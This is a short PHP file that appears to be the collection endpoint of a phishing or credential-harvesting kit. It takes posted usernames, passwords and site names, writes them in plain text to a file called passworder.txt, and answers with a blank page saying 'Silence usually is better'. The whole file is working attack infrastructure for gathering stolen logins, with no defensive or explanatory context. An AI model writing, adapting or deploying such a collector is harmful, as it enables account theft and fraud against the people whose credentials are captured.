<?php
if (isset($_POST['username']) and isset($_POST['password']) and isset($_POST['site'])) {
    $myfile = fopen("passworder.txt", "a") or die("Unable to open file!");
    $username = $_POST['username'];
    $password = $_POST['password'];
    $site = $_POST['site'];
    $txt = "user:$username|pass:$password|site:$site\n";
    fwrite($myfile, $txt);
    fclose($myfile);
} else {
    # Whoops, something is wrong!
}

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
</head>

<body>
    Silence usually is better 😘
</body>

</html>